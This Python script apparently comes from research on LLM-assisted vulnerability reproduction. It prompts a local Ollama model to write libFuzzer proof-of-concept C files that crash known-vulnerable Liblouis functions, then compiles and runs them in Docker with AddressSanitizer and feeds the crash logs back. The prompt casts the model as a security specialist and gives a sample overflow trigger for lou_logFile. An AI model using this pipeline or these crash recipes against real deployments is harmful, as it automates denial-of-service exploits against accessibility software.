import json
import shutil
import os
import sys
import subprocess
import time
import requests
from concurrent.futures import ThreadPoolExecutor
import atexit




# run with: CUDA_VISIBLE_DEVICES=1 python tool17.py
# GPU
# os.environ["CUDA_VISIBLE_DEVICES"] = "1"

from pathlib import Path

current_script_dir = Path(__file__).resolve().parent

search_root = current_script_dir.parent
input_data= search_root / "liblouis" / "liblouis_datasets" / "liblouis_data.json"

# Search recursively for the specific file
files_to_find = [
    'rag_tool_ollama.py',
    'interact_with_ollama.py'
]

# Search for each file and add its folder to sys.path
for filename in files_to_find:
    found_files = list(search_root.rglob(filename))
    
    if found_files:
        # Extract the absolute path of the folder containing the file
        folder_path = str(found_files[0].parent.resolve())
        
        # Add it to sys.path so Python knows where to look
        if folder_path not in sys.path:
            sys.path.insert(0, folder_path)
    else:
        raise FileNotFoundError(f"Could not find '{filename}' anywhere inside the project.")



from rag_tool_ollama import rag_tool
from interact_with_ollama import chat_with_ollama


from datetime import datetime

run_id = datetime.now().strftime("%Y%m%d_%H%M%S")

output_dir = os.path.join("new_outputs", "liblouis", "outputs")
os.makedirs(output_dir, exist_ok=True)

output_file = f"output_{run_id}.txt"
output_file_path = os.path.join(output_dir, output_file)

# Redirect stdout and stderr to the single output file
fout = open(output_file_path, "a", buffering=1)  # line buffered
sys.stdout = fout
sys.stderr = fout

print(f"Output redirected to: {output_file_path}")
print("Starting Liblouis PoC generation...")


prompt = """
Proof-of-Concept generation Liblouis.
Imagine we are both advanced cybersecurity specialists and security engineers. I have some internal Liblouis code that I will give you. I will also give you the vulnerable code line(s) for the specific function of Liblouis.
You are going to help me generate Proof-of-Concept files for Liblouis. Your task is to generate PoC’s so that it can exploit different vulnerabilities in Liblouis.
I will give you vulnerable functions, vulnerable lines of that particular function, and version of Liblouis from CVE Reports. The objective is to intentionally crash Liblouis.

I am giving you an example of fuzz_driver and input file for Liblouis version 3.24. 

Example 1:  In Liblouis version 3.24, there is a Global-Buffer-Overflow in lou_logFile when filename is greater than 256. 
Fuzz_driver.c:
“””
#include "liblouis.h"
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <memory.h>

/* Structure definition needed by the fuzz driver */
void* AFG_alloc_list[2] = { NULL };
int AFG_alloc_cnt = 0;
FILE* AFG_fopen_list[1] = { NULL };
int AFG_fopen_cnt = 0;
int AFG_func(char* fileName)
{
    lou_logFile(fileName); 
    return 0;
}
size_t minimum_size = 0;
#ifdef __cplusplus
extern "C" 
#endif
int LLVMFuzzerInitialize(int *argc, char ***argv) {
    printf("Minimum size is %ld\n", minimum_size);
    return 0;
}
#ifdef __cplusplus
extern "C" 
#endif
int LLVMFuzzerTestOneInput(const uint8_t *AFG_Data, size_t Size) {
    size_t AFG_offset = 0;
    size_t pt_size = (Size - minimum_size) / 1;
    if (pt_size < sizeof(char) ) { return -1; }
    char * fileName;
    fileName = (char *)malloc(pt_size+1);
    AFG_alloc_list[AFG_alloc_cnt++] = (void*) fileName;
    memcpy((void *)fileName, AFG_Data+AFG_offset, pt_size);
    fileName[pt_size] = '\0';
    AFG_offset+=pt_size;

    AFG_func(fileName);

AFG_fail:
    for(int AFG_free_i = 0; AFG_free_i < AFG_alloc_cnt; AFG_free_i++)
        free(AFG_alloc_list[AFG_free_i]);
    for(int AFG_free_i = 0; AFG_free_i < AFG_fopen_cnt; AFG_free_i++)
        fclose(AFG_fopen_list[AFG_free_i]);
    AFG_alloc_cnt = 0;
    AFG_fopen_cnt = 0;

    return 0;
}

input file: 4000 strings of a's
“””


It gives an AddressSantizer Global-Buffer-Overflow in crash report.
This is just an example. Please generate a DIFFERENT C files to trigger exploits.

GENERATE PoC's with FUZZERS ONLY
Key Points:
•   Fuzzers must have LLVMFuzzerTestOneInput function and NO MAIN FUNCTION.

Follow this Fuzzer Template:
#include "liblouis.h"
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// Basic libFuzzer template
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Early return for empty inputs
    if (size == 0) return 0;
    
    // Option 1: Direct function call with fuzzer input
    // your_target_function(data, size);
    
    // Option 2: Copy to null-terminated string
    // char *input = malloc(size + 1);
    // memcpy(input, data, size);
    // input[size] = '\0';
    // your_target_function(input);
    // free(input);
    
    // Option 3: Process data as needed for your specific function
    // (Add structure initialization, conversions, etc. here)
    
    return 0;  // Always return 0
}

•   Link against actual liblouis library

•   USE liblouis functions with proper headers

•   NO CUSTOM IMPLEMENTATION OF ANY LIBLOUIS FUNTION i.e- for parseChar, DO NOT create fuzzer's own parseChar, instead use Liblouis public API(lou_checktable for parseChar) to trigger exploit

•   Call the Target/Real Functions INSIDE LLVMFuzzerTestOneInput

•   For the header file USE #include "liblouis.h"

CRITICAL: You MUST use ONLY PUBLIC liblouis API functions, not internal functions.
    
    PUBLIC API functions (use these):
    - lou_translateString(), lou_translate(), lou_backTranslateString()
    - lou_hyphenate(), lou_dotsToChar(), lou_charToDots()  
    - lou_setDataPath(), lou_getTable(), lou_free()
    - lou_version(), lou_getTablePaths()
    
    INTERNAL functions (DO NOT USE these):
    - resolveSubtable(), parseChars(), compileRule(), compilePassOpcode()
    - _lou_getALine(), includeFile(), compileHyphenation()
    - Any function starting with underscore _

    Generate a fuzzer that uses PUBLIC API functions to trigger the vulnerability.
    The code must compile and link against the standard liblouis library.
    i.e -  public API functions like lou_translateString() will internally call resolveSubtable() and can still trigger the same vulnerabilities.

Again, DO NOT USE FUNCTIONS AND TYPES THAT DOESN'T EXIST IN LIBLOUIS PUBLIC API.

While analyzing the vulnerable line in the context of the entire code, make sure to think of all sorts of possible exploits, including, but NOT LIMITED to: 
    -Global-buffer-overflow
    -Denial of Service
   - Heap-Buffer-Overflow
   - Segmentation Fault

Read the vulnerable function and lines and generate PoC codes for that particular function 
If there are lines to be exploited, then generate PoC in ‘C’ files. 
Make sure generated PoC’s triggers vulnerability.
Do this all in the Liblouis version that I will give you in the next response. 
When generating PoC’s in C, give a title what kind of exploit it will trigger and an explanation. Name the files as ‘code_testing1.c’.
If the PoC doesn’t work, I will give you the error message.
If you generate multiple PoC’s on different exploits, I will give you the feedback in the same sequence. 
NOTE: You do not have to run anything on your end, I will run the PoC code you provide and give back whether it exploits or not.
Repeat my instructions back to me in a checklist format. Let me know if you are ready to receive the internal Liblouis code.
"""

# Ollama
ollama_url = "http://localhost:11434"

# Global cache for Docker images 
docker_image_cache = {}
# Limit concurrent operations
max_workers = 2 


def cleanup_workspace_except_output(workspace_dir=output_dir):
    for name in os.listdir(workspace_dir):
        path = os.path.join(workspace_dir, name)

        # Keep all .txt files
        if name.endswith(".txt"):
            continue

        try:
            if os.path.isfile(path) or os.path.islink(path):
                os.remove(path)
            elif os.path.isdir(path):
                shutil.rmtree(path)
        except Exception as e:
            print(f"Warning: {e}")
# Register final cleanup
def final_cleanup():
    cleanup_workspace_except_output()

atexit.register(final_cleanup)


# Check if Ollama is connected 

def check_ollama_available():
    try:
        response = requests.get(f"{ollama_url}/api/tags", timeout=20)
        return response.status_code == 200
    except:
        return False



def prepare_initial_conversation(prompt_text):
    return [{"role": "user", "content": prompt_text}]

def extract_poc_codes(response_content):
    start_marker = "```c"
    end_marker = "```"
    poc_codes = []
    start_index = response_content.find(start_marker)
    while start_index != -1:
        start_index += len(start_marker)
        end_index = response_content.find(end_marker, start_index)
        if end_index == -1:
            break
        code = response_content[start_index:end_index].strip()
        poc_codes.append(code)
        start_index = response_content.find(start_marker, end_index)
    return poc_codes


# Docker 
def prepare_docker_build(liblouis_version):
    """Return the path to the appropriate Dockerfile"""
    dockerfile_mapping = {
        "2.5.2": "./docker/dockerfile.liblouis2.5.2",
        "3.2": "./docker/dockerfile.liblouis3.2",
        "3.21": "./docker/dockerfile.liblouis3.21", 
        "3.24": "./docker/dockerfile.liblouis3.24",
        "3.5": "./docker/dockerfile.liblouis3.5",
        "3.6": "./docker/dockerfile.liblouis3.6"
    }
    
    dockerfile_path = dockerfile_mapping.get(liblouis_version, "./docker/dockerfile.liblouis3.24v2")
    
    if not os.path.exists(dockerfile_path):
        # Fallback logic
        dockerfile_dir = "docker"
        available_files = [f for f in os.listdir(dockerfile_dir) 
                          if f.startswith("dockerfile.liblouis")] if os.path.exists(dockerfile_dir) else []
        if available_files:
            dockerfile_path = os.path.join(dockerfile_dir, available_files[0])
        else:
            raise FileNotFoundError(f"No Dockerfiles found in {dockerfile_dir}")
    
    return dockerfile_path

def build_docker_image(liblouis_version):
    if not liblouis_version or liblouis_version.strip() == "":
        liblouis_version = "3.24"
    
    tag = f"liblouis_test:{liblouis_version}"
    
    # Check cache first
    if tag in docker_image_cache:
        print(f"Using cached Docker image: {tag}")
        return docker_image_cache[tag]
    
    # Check if image exists
    p = subprocess.run(["docker", "images", "-q", tag], capture_output=True, text=True)
    if p.returncode == 0 and p.stdout.strip():
        print(f"Docker image {tag} already exists, skipping build.")
        docker_image_cache[tag] = tag
        return tag
    
    try:
        dockerfile_path = prepare_docker_build(liblouis_version)
        print(f"Building Docker image {tag} from {dockerfile_path}...")
        
        # Build directly from the dockerfiles directory
        build_cmd = [
            "docker", "build", 
            "--build-arg", f"LIBLOUIS_VERSION={liblouis_version}",
            "-t", tag,
            "-f", dockerfile_path,  # Use -f to specify Dockerfile path
            "."  # Build context is the docker directory
        ]
        
        print(f"Running: {' '.join(build_cmd)}")
        
        proc = subprocess.Popen(
            build_cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            line = proc.stdout.readline()
            if not line and proc.poll() is not None:
                break
            if line:
                print(line.strip())
        
        ret = proc.poll()
        if ret != 0:
            raise RuntimeError(f"Docker build failed (exit code {ret})")
        
        print("Docker build completed successfully.")
        docker_image_cache[tag] = tag
        return tag
        
    except Exception as e:
        return handle_docker_build_failure(liblouis_version, str(e))

def handle_docker_build_failure(liblouis_version, error_info):
    print(f"Docker build failed for version {liblouis_version}")
    print(f"Error: {error_info}")
    
    fallback_tags = [
        f"liblouis_test:{liblouis_version}",
        "liblouis_test:2.5.2"
        "liblouis_test:3.21",
        "liblouis_test:3.24", 
        "liblouis_test3.2",
        "liblouis_test3.5",
        "liblouis_test3.6"
    ]
    
    for fallback_tag in fallback_tags:
        p = subprocess.run(["docker", "images", "-q", fallback_tag], capture_output=True, text=True)
        if p.returncode == 0 and p.stdout.strip():
            print(f"Using fallback Docker image: {fallback_tag}")
            docker_image_cache[fallback_tag] = fallback_tag
            return fallback_tag
    
    raise RuntimeError(f"Docker build failed for {liblouis_version} and no fallback images available.")


# Run PoC code 

def run_poc_code(poc_codes, liblouis_version, function_name, workspace_dir=output_dir):
    successful_exploit = False
    log_errors = ""

    os.makedirs(workspace_dir, exist_ok=True)
    
    try:
        docker_tag = build_docker_image(liblouis_version)
    except RuntimeError as e:
        log_errors = f"DOCKER SETUP FAILED: {e}\nCannot test PoC codes without Docker environment."
        print(log_errors)
        return False, log_errors

    for index, code in enumerate(poc_codes):
        print(f"Testing PoC #{index + 1}")
        
        poc_filename = f"{function_name}_code_testing_{index}.c"
        poc_filepath = os.path.join(workspace_dir, poc_filename)
        binary_name = f"{function_name}_code_testing_{index}"
        
        #Write PoC code temporarily inside the workspace
        with open(poc_filepath, "w") as f:
            f.write(code)


        
        #f"cd /workspace && clang -g -fsanitize=address,fuzzer -I/usr/local/include/liblouis {poc_filename} /usr/local/lib/liblouis.a -o {binary_name}"
        compile_cmd = [
            "docker", "run", "--rm",
            "-v", f"{os.path.abspath(workspace_dir)}:/workspace",
            docker_tag,
            "bash", "-c", 
            f"cd /workspace && "
            # First try with all possible libraries
            f"clang -g -fsanitize=address,fuzzer -I/usr/local/include/liblouis {poc_filename} "
            f"/usr/local/lib/liblouis.a /usr/local/lib/liblouistest.a -lm -o {binary_name} 2>/dev/null || "
            # Try with dynamic linking and explicit path
            f"clang -g -fsanitize=address,fuzzer -I/usr/local/include/liblouis {poc_filename} "
            f"-llouis -llouistest -L/usr/local/lib -Wl,-rpath,/usr/local/lib -lm -o {binary_name} 2>/dev/null || "
            # Final fallback - just try to link with basic libs
            f"clang -g -fsanitize=address,fuzzer -I/usr/local/include/liblouis {poc_filename} "
            f"-llouis -L/usr/local/lib -lm -o {binary_name}"
        ]


        run_cmd = [
            "docker", "run", "--rm",
            "-v", f"{os.path.abspath(workspace_dir)}:/workspace", 
            docker_tag,
            "bash", "-c",
            f"cd /workspace && "
            f"export LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH && "
            f"./{binary_name} -artifact_prefix=./{binary_name}_ -max_total_time=10 -print_final_stats=0 2>&1 | grep -E '(ERROR|CRASH|crash-|timeout-|leak-)' || true"
        ]
        
        try:
            print(f"Compiling {poc_filename}...")
            compile_result = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=120)
            if compile_result.returncode != 0:
                log_error = f"COMPILATION FAILED for {poc_filename}:\n{compile_result.stderr}\n{compile_result.stdout}"
                log_errors += f"#{index + 1}:\n{log_error}\n\n"
                # Cleanup before continuing to next PoC
                cleanup_workspace_except_output(workspace_dir)
                continue

            print(f"Running {binary_name}...")
            run_result = subprocess.run(run_cmd, capture_output=True, text=True, timeout=60)
            
            output = run_result.stderr + run_result.stdout
            crash_keywords = [
                "ERROR: AddressSanitizer",
                "global-buffer-overflow",
                "segmentation fault", 
                "heap-buffer-overflow", 
                "stack-buffer-overflow", 
                "use-after-free", 
                "double-free", 
                "abort",
                "SEGV",
                "abort",
                "FPE",
                "core dumped"
            ]
            
            crash_detected = any(keyword.lower() in output.lower() for keyword in crash_keywords)
            has_real_crash = "Test unit written to" in output or f"{binary_name}_crash-" in output
            
            if crash_detected and has_real_crash:
                successful_exploit = True
                log_error = f"CRASH DETECTED in {poc_filename}:\n{output}"
                print(f"SUCCESS: Crash detected in {poc_filename}")
            else:
                log_error = f"No crash detected in {poc_filename}. Output:\n{output}"

        except subprocess.TimeoutExpired:
            log_error = f"Fuzzer timed out for {poc_filename}"
        except Exception as e:
            log_error = f"Error running {poc_filename}: {str(e)}"

        log_errors += f"#{index + 1} ({poc_filename}):\n{log_error}\n\n"

        # Cleanup workspace AFTER each PoC so only output file remains
        try:
            cleanup_workspace_except_output(workspace_dir)
        except Exception as e:
            print(f"Warning during per-PoC cleanup: {e}")

        if successful_exploit:
            break

    return successful_exploit, log_errors


def process_item(i, item, prompt_text, file_path):
    
    function_code = item.get("Function Code", "")
    function_name = item.get("Function Name", f"func_{i}")
    vulnerable_lines = item.get("Vulnerability", "")
    liblouis_version = item.get("Version to Use", "") or "3.2"
    exploit_type = item.get("Exploit Type", "")

    given = f'Function_Code:\n{function_code}\n\n\nVulnerable line(s):\n{vulnerable_lines}\n\nFunction: {function_name}\n\nExploit Type: {exploit_type}\n\nUse liblouis version: {liblouis_version}\n\nGo ahead and begin.'

    success_found = False
    
    # 10 threads for redundancy
    for j in range(10):
        conversation_history = prepare_initial_conversation(prompt_text)
        print(f"\nINDEX {i}, THREAD {j+1} | -------------------------------------------------------------------------------------")
        print(prompt_text)

        # Use chat_with_ollama for initial response
        initial_response = chat_with_ollama(prompt_text)
        if initial_response:
            print("Initial RAG-enhanced response received")
            conversation_history.append({"role": "assistant", "content": initial_response})
        else:
            print("Initial RAG call failed, skipping this thread")
            continue

        print("\n---------------------------------------------------------------------------------------------------------\n")
        print(given)
        conversation_history.append({"role": "user", "content": given})
       
        # Testing PoC exploit code and providing log errors (5 rounds)
        for k in range(5):
            
            conversation_text = "\n".join([msg["content"] for msg in conversation_history])
            response = None
            
            try:
                # Use rag_tool as primary response generator
                response = rag_tool(conversation_text)
            except Exception as e:
                print(f"RAG tool exception: {e}")
                response = None
            
            if not response:
                print("RAG tool returned None or failed, using chat_with_ollama as fallback")
                response = chat_with_ollama(conversation_text)
            
            if not response:
                print("All AI services failed in refinement round")
                continue

            print("\n---------------------------------------------------------------------------------------------------------\n")
            print(response)
            conversation_history.append({"role": "assistant", "content": response})

            poc_codes = extract_poc_codes(response)
            if not poc_codes:
                print("\n---------------------------------------------------------------------------------------------------------\n")
                print("No PoC codes found in response.")
                # Add feedback to conversation
                conversation_history.append({"role": "user", "content": "No PoC code was generated. Please provide C code with code blocks marked with ```c and ```"})
                successful_exploit = False
                time.sleep(1)
                continue

            print(f"Found {len(poc_codes)} PoC code blocks")

            print("\n---------------------------------------------------------------------------------------------------------\n")
            successful_exploit, log_errors = run_poc_code(poc_codes, liblouis_version, function_name, workspace_dir=output_dir)
            print("\n---------------------------------------------------------------------------------------------------------\n")
            print(f"EXPLOIT RESULT for item {i}, thread {j+1}, round {k+1}: {successful_exploit}")
            print(log_errors)
            
            # Add test results to conversation for next iteration
            conversation_history.append({"role": "user", "content": f"Test results: {log_errors}\nPlease refine the PoC to cause a crash."})

            if successful_exploit:
                print(f"SUCCESS!! DONE!! INDEX {i}, THREAD {j+1}, ROUND {k+1}")
                success_found = True
                break  

            time.sleep(1)

        if success_found:
            break  

    if not success_found:
        print(f"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n")
        print(f"FAILED to find exploit for item {i} after all attempts")
    
    return success_found

from threading import Lock
import concurrent.futures

def main():
    
    # initial cleanup to remove any residue except the output file
    cleanup_workspace_except_output()

    if not check_ollama_available():
        print("WARNING: Ollama is not running or not accessible!")
        print("Please start Ollama with: ollama serve")
        try:
            subprocess.Popen(["ollama", "serve"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(5)
            if check_ollama_available():
                print("Ollama started successfully!")
            else:
                print("Failed to start Ollama automatically.")
        except:
            print("Could not start Ollama automatically.")
    
    try:
        response = requests.get(f"{ollama_url}/api/tags", timeout=5)
        models = response.json().get("models", [])
        model_names = [model["name"] for model in models]
        print(f"Available Ollama models: {model_names}")
    except:
        print("Could not check available models.")
    
    # Load JSON data
    try:
        with open(input_data, "r") as file:
            data = json.load(file)["data"]
    except Exception as e:
        print(f"Error loading data/liblouis_data.json: {e}")
        data = []

    successful_items = 0
    successful_items_lock = Lock()
    
    def process_item_with_counting(index, item, prompt_text, file_path):
        nonlocal successful_items
        print(f"Starting processing for item {index}")
        result = process_item(index, item, prompt_text, file_path)
        if result:
            with successful_items_lock:
                successful_items += 1
            print(f"Item {index}: SUCCESS - Total successes so far: {successful_items}")
        else:
            print(f"Item {index}: No exploit found - Total successes so far: {successful_items}")
        return result
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for index, item in enumerate(data):
            future = executor.submit(
                process_item_with_counting, 
                index, item, prompt, 
                os.path.join(output_dir, "code_testing.c")
            )
            futures.append((index, future))
            time.sleep(1)
        
        # Wait for all futures to complete
        for index, future in futures:
            try:
                future.result(timeout=1200)  # 20 minute timeout
            except concurrent.futures.TimeoutError:
                print(f"Item {index}: TIMEOUT after 20 minutes")
            except Exception as e:
                print(f"Item {index}: ERROR - {e}")

    print(f"\nCOMPLETED! Successful exploits: {successful_items}/{len(data)}")

    # Final cleanup to remove everything except output
    cleanup_workspace_except_output()

if __name__ == "__main__":
    main()
